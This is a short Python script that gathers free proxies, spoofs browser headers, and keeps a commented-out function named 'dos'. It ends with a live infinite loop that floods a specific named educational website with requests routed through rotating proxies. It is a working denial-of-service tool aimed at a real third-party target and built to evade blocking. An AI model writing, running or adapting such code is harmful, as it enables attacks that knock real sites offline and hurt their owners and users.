import requests, random
from fake_headers import Headers
from fp.fp import FreeProxy


def get_proxy(url, number=1):
	header = Headers(headers=True)

	proxy_list = []

	while True:
		prox = FreeProxy(rand=True).get()[7:]
		try:
			responce = requests.get(url=url, headers=header.generate(), proxies={"http": prox, "https": prox})
		except:
			continue
		
		if responce.status_code == 200:
			proxy_list.append(prox)
		
		if len(proxy_list) == number:
			break
	
	return proxy_list

		
	
	return proxy_list


# def dos(url, number, proxy_list):

# 	header = Headers(headers=True)

# 	for i in range(number):
# 		proxy = random.choice(proxy_list)
# 		try:
# 			responce = requests.get(url=url, headers=header.generate(), proxies={"http": proxy, "https": proxy})
# 			print(i+1, responce.status_code)
# 		except:
# 			print(i+1, responce.status_code)
# 			continue

# prx = get_proxy(3)
# # prx = ['3.6.101.45:8080', '51.159.115.233:3128', '117.251.103.186:8080']
# for i in range(30):
# 	header = Headers(headers=True)
# 	prox = random.choice(prx)
# 	responce = requests.get(url="http://127.0.0.1:5001/", headers=header.generate(), proxies={"http": prox, "https": prox})
# 	print(responce.status_code)


# print(get_proxy(url="http://dvnzchgek.edu.ua/underground/j4/", number=15))

# proxy = ['3.6.101.45:8080', '3.6.101.45:8080', '45.62.161.7:8080', '117.251.103.186:8080', '8.219.97.248:80']

url="http://dvnzchgek.edu.ua/underground/j4/"

proxy = ['8.219.97.248:80', '193.233.202.75:8080', '3.6.101.45:8080', '20.44.206.138:80', '157.245.27.9:3128', '186.121.235.222:8080', '43.229.132.76:8080', '8.219.97.248:80', '129.159.112.251:3128', '104.149.150.108:27007', '104.149.150.108:27007', '202.86.138.18:8080', '202.86.138.18:8080', '117.251.103.186:8080', '3.6.101.45:8080']


while True:
    try:
        a = requests.get(url=url, proxies={"http": random.choice(proxy), "https": random.choice(proxy)})
        print(a.status_code)
    except:
        continue